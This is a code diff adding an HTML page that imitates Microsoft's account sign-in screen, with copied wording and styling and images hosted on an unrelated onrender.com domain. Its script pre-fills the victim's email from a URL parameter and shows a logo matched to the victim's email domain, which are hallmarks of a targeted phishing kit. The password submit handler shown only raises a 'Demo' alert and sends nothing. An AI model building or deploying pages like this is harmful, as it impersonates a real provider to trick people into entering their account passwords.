@@ -1,0 +1,580 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your Microsoft account</title>
+    <style>
+        /* General Reset */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f3f2f1;
+            background-image: url('https://friendly-winner-images.onrender.com/bg.png');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* The Main Card */
+        .login-container {
+            background-color: #fff;
+            width: 440px;
+            padding: 44px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+            border-radius: 4px;
+            text-align: center;
+            z-index: 10;
+            position: relative;
+            min-height: 400px;
+        }
+
+        /* Header Section */
+        .card-header {
+            position: relative;
+            margin-bottom: 16px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 32px; 
+        }
+
+        /* Dynamic Logo Link */
+        .logo-link {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-decoration: none;
+            height: 100%;
+        }
+
+        .logo-img {
+            max-width: 108px; 
+            max-height: 32px;
+            object-fit: contain;
+        }
+
+        /* Back Arrow Styling */
+        .back-arrow {
+            position: absolute;
+            left: -10px;
+            top: -1px;
+            cursor: pointer;
+            display: none;
+            padding: 8px;
+            border-radius: 50%;
+            transition: background-color 0.2s;
+        }
+
+        .back-arrow:hover {
+            background-color: #f3f2f1;
+        }
+
+        .back-arrow svg {
+            width: 20px;
+            height: 20px;
+            fill: #5e5e5e;
+        }
+        
+        .back-arrow:hover svg {
+            fill: #1b1b1b;
+        }
+
+        /* Typography */
+        h1 {
+            font-size: 24px;
+            font-weight: 600; 
+            color: #1b1b1b;
+            margin-bottom: 16px;
+        }
+
+        .subtitle {
+            font-size: 15px;
+            color: #666; 
+            margin-bottom: 24px;
+        }
+
+        /* Email Pill Display */
+        .email-pill {
+            display: none;
+            background-color: #f3f2f1;
+            color: #666; 
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 14px;
+            margin: 0 auto 24px auto;
+            width: fit-content;
+        }
+
+        /* Form Layout Engine */
+        .form-section {
+            display: flex;
+            flex-direction: column;
+            gap: 24px; 
+        }
+
+        /* Input Area Wrapper */
+        .input-area {
+            display: flex;
+            flex-direction: column;
+            gap: 4px; 
+            text-align: left;
+            min-height: 58px; 
+        }
+
+        .input-group {
+            position: relative;
+        }
+
+        .input-wrapper {
+            position: relative;
+            padding-top: 10px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px 10px;
+            border: 1px solid #666;
+            border-radius: 4px;
+            font-size: 15px;
+            outline: none;
+            height: 40px;
+            transition: border-color 0.2s;
+            background: transparent;
+        }
+
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            border: 2px solid #0067b8; 
+            padding: 11px 9px;
+        }
+
+        /* Floating Label */
+        .floating-label {
+            position: absolute;
+            left: 10px;
+            top: 20px;
+            font-size: 15px;
+            color: #666;
+            transition: 0.2s ease all;
+            pointer-events: none;
+            background-color: #fff;
+            padding: 0 4px;
+        }
+
+        input[type="text"]:focus ~ .floating-label,
+        input[type="text"]:not(:placeholder-shown) ~ .floating-label,
+        input[type="password"]:focus ~ .floating-label,
+        input[type="password"]:not(:placeholder-shown) ~ .floating-label {
+            top: 4px;
+            font-size: 13px;
+            color: #0067b8; 
+        }
+
+        /* Password Toggle Icon */
+        .password-toggle {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-30%);
+            cursor: pointer;
+            color: #666;
+            display: none;
+        }
+        
+        .password-toggle svg {
+            width: 20px;
+            height: 20px;
+            fill: currentColor;
+        }
+
+        /* Error State Styling */
+        .input-group.error input[type="text"],
+        .input-group.error input[type="password"] {
+            border: 1px solid #d13438;
+            border-bottom: 2px solid #d13438;
+        }
+
+        .input-group.error .floating-label {
+            color: #d13438;
+        }
+
+        .error-message {
+            visibility: hidden;
+            height: 16px; 
+            color: #d13438;
+            font-size: 13px;
+            text-align: left;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .input-group.error + .error-message {
+            visibility: visible;
+        }
+
+        .error-icon {
+            width: 16px;
+            height: 16px;
+            fill: #d13438;
+            flex-shrink: 0;
+        }
+
+        /* Links */
+        .forgot-link {
+            display: block;
+            text-align: left;
+            font-size: 15px; 
+            font-weight: 600; 
+            color: #0067b8; 
+            text-decoration: none;
+            margin-top: 8px;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+            color: #004578;
+        }
+
+        /* Buttons */
+        .btn-next {
+            width: 100%;
+            background-color: #0067b8; 
+            color: white;
+            border: none;
+            padding: 10px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            border-radius: 2px; 
+            transition: background 0.2s;
+        }
+
+        .btn-next:hover {
+            background-color: #005da6;
+        }
+
+        /* Footer Links inside card */
+        .create-account {
+            font-size: 15px;
+            color: #1b1b1b;
+            display: block;
+            margin-top: 24px;
+        }
+
+        .create-account a {
+            color: #0067b8;
+            font-weight: 600;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .create-account a:hover {
+            text-decoration: underline;
+        }
+
+        /* State Management */
+        .step-email .create-account { display: block; }
+        .step-email .email-pill { display: none; }
+        .step-email .back-arrow { display: none; }
+
+        .step-password .create-account { display: none; }
+        .step-password .email-pill { display: block; }
+        .step-password .back-arrow { display: block; }
+        .step-password .email-input-group { display: none; }
+        .step-password .forgot-link { display: none; }
+        .step-password .password-group { display: block; }
+        .step-password .password-toggle { display: block; }
+
+        /* Global Footer Layout - Centered */
+        .global-footer {
+            position: absolute;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            font-size: 12px;
+            color: #666;
+            z-index: 10;
+            width: max-content;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 24px; 
+            margin-bottom: 8px; 
+        }
+
+        .global-footer a {
+            color: #666;
+            text-decoration: none;
+        }
+
+        .global-footer a:hover {
+            text-decoration: underline;
+        }
+
+        .privacy-notice {
+            font-size: 12px;
+            color: #333;
+        }
+
+        .privacy-notice a {
+            color: #0067b8;
+            font-weight: 500;
+        }
+        
+        .privacy-notice a:hover {
+            text-decoration: underline;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .login-container {
+                width: 100%;
+                height: 100%;
+                box-shadow: none;
+                padding: 20px;
+                border-radius: 0;
+                display: flex;
+                flex-direction: column;
+                justify-content: center;
+            }
+            .global-footer {
+                display: none;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container step-email" id="loginCard">
+        
+        <div class="card-header">
+            <span class="back-arrow" id="backBtn">
+                <svg viewBox="0 0 24 24">
+                    <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
+                </svg>
+            </span>
+            <a href="#" class="logo-link">
+                <img src="https://friendly-winner-images.onrender.com/logo.png" alt="Logo" class="logo-img" id="dynamicLogo" onerror="this.src='https://friendly-winner-images.onrender.com/logo.png';">
+            </a>
+        </div>
+        
+        <div class="email-pill" id="displayEmail"></div>
+        
+        <h1 id="mainHeading">Sign in</h1>
+        
+        <p class="subtitle" id="subHeading">Use your Microsoft account.</p>
+
+        <form id="loginForm" novalidate class="form-section">
+            
+            <!-- EMAIL STEP -->
+            <div class="email-input-group">
+                <div class="input-area">
+                    <div class="input-group" id="emailGroup">
+                        <div class="input-wrapper">
+                            <input type="text" id="emailInput" placeholder=" " aria-label="Email">
+                            <label for="emailInput" class="floating-label">Email or phone number</label>
+                        </div>
+                    </div>
+                    
+                    <div class="error-message" id="emailError">
+                        <svg class="error-icon" viewBox="0 0 24 24">
+                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                        </svg>
+                        Enter a valid email address or phone number
+                    </div>
+                </div>
+                
+                <a href="#" class="forgot-link">Forgot your username?</a>
+            </div>
+
+            <!-- PASSWORD STEP -->
+            <div class="password-group" style="display: none;">
+                <div class="input-area">
+                    <div class="input-group" id="passwordGroup">
+                        <div class="input-wrapper">
+                            <input type="password" id="passwordInput" placeholder=" " aria-label="Password">
+                            <label for="passwordInput" class="floating-label">Password</label>
+                            <span class="password-toggle" id="togglePassword">
+                                <svg viewBox="0 0 24 24">
+                                    <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+                                </svg>
+                            </span>
+                        </div>
+                    </div>
+                    
+                    <div class="error-message" id="passwordError">
+                        <svg class="error-icon" viewBox="0 0 24 24">
+                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                        </svg>
+                        Enter the password for your Microsoft account.
+                    </div>
+                </div>
+
+                <a href="#" class="forgot-link">Forgot password?</a>
+            </div>
+            
+            <button type="submit" class="btn-next" id="nextBtn">Next</button>
+        </form>
+
+        <div class="create-account">
+            New to Microsoft? <a href="#">Create an account</a>
+        </div>
+
+    </div>
+
+    <!-- Bottom Footer Structure - Centered -->
+    <div class="global-footer">
+        <div class="footer-links">
+            <a href="#">Help and feedback</a>
+            <a href="#">Terms of use</a>
+            <a href="#">Privacy and cookies</a>
+        </div>
+        <div class="privacy-notice">
+            Use private browsing if this is not your device. <a href="#">Learn more</a>
+        </div>
+    </div>
+
+    <script>
+        const form = document.getElementById('loginForm');
+        const emailInput = document.getElementById('emailInput');
+        const emailGroup = document.getElementById('emailGroup');
+        const passwordInput = document.getElementById('passwordInput');
+        const passwordGroup = document.getElementById('passwordGroup');
+        const loginCard = document.getElementById('loginCard');
+        const displayEmail = document.getElementById('displayEmail');
+        const mainHeading = document.getElementById('mainHeading');
+        const subHeading = document.getElementById('subHeading');
+        const backBtn = document.getElementById('backBtn');
+        const togglePassword = document.getElementById('togglePassword');
+        const dynamicLogo = document.getElementById('dynamicLogo');
+
+        const defaultLogoUrl = 'https://friendly-winner-images.onrender.com/logo.png';
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        let currentStep = 'email';
+
+        // Function to update logo based on domain
+        function updateLogoForDomain(email) {
+            if (!email || !email.includes('@')) {
+                dynamicLogo.src = defaultLogoUrl;
+                return;
+            }
+            const domain = email.split('@')[1];
+            const logoApiUrl = `https://logo.clearbit.com/${domain}`;
+            dynamicLogo.src = logoApiUrl;
+        }
+
+        // Check URL for email parameter on page load
+        window.addEventListener('DOMContentLoaded', () => {
+            const urlParams = new URLSearchParams(window.location.search);
+            const emailParam = urlParams.get('email');
+
+            if (emailParam) {
+                const decodedEmail = decodeURIComponent(emailParam).trim();
+                if (emailRegex.test(decodedEmail)) {
+                    // 1. Populate the input
+                    emailInput.value = decodedEmail;
+                    // 2. Fetch the logo in the background based on the domain
+                    updateLogoForDomain(decodedEmail);
+                    
+                    // NOTE: We removed the automatic transition here. 
+                    // The user must now click "Next" to proceed.
+                }
+            }
+        });
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault(); 
+            
+            if (currentStep === 'email') {
+                const emailValue = emailInput.value.trim();
+                emailGroup.classList.remove('error');
+
+                if (emailValue === '' || !emailRegex.test(emailValue)) {
+                    emailGroup.classList.add('error');
+                    emailInput.focus();
+                } else {
+                    // Move to password screen only when the button is clicked
+                    currentStep = 'password';
+                    loginCard.classList.remove('step-email');
+                    loginCard.classList.add('step-password');
+                    
+                    displayEmail.textContent = emailValue;
+                    mainHeading.textContent = 'Enter your password';
+                    subHeading.style.display = 'none'; 
+                    
+                    // Ensure logo is updated if they typed it manually
+                    updateLogoForDomain(emailValue);
+                    
+                    document.querySelector('.email-input-group').style.display = 'none';
+                    document.querySelector('.password-group').style.display = 'block';
+                    
+                    setTimeout(() => passwordInput.focus(), 100);
+                }
+            } else {
+                const passwordValue = passwordInput.value.trim();
+                passwordGroup.classList.remove('error');
+
+                if (passwordValue === '') {
+                    passwordGroup.classList.add('error');
+                    passwordInput.focus();
+                } else {
+                    alert("Password submitted (Demo)");
+                }
+            }
+        });
+
+        backBtn.addEventListener('click', function() {
+            currentStep = 'email';
+            loginCard.classList.remove('step-password');
+            loginCard.classList.add('step-email');
+            
+            mainHeading.textContent = 'Sign in';
+            subHeading.style.display = 'block';
+            
+            dynamicLogo.src = defaultLogoUrl;
+            
+            document.querySelector('.email-input-group').style.display = 'block';
+            document.querySelector('.password-group').style.display = 'none';
+            
+            passwordInput.value = '';
+            passwordGroup.classList.remove('error');
+            setTimeout(() => emailInput.focus(), 100);
+        });
+
+        emailInput.addEventListener('input', function() {
+            if (emailGroup.classList.contains('error')) {
+                emailGroup.classList.remove('error');
+            }
+        });
+
+        passwordInput.addEventListener('input', function() {
+            if (passwordGroup.classList.contains('error')) {
+                passwordGroup.classList.remove('error');
+            }
+        });
+
+        togglePassword.addEventListener('click', function() {
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+            this.style.opacity = type === 'text' ? '1' : '0.7';
+        });
+    </script>
+</body>
+</html>
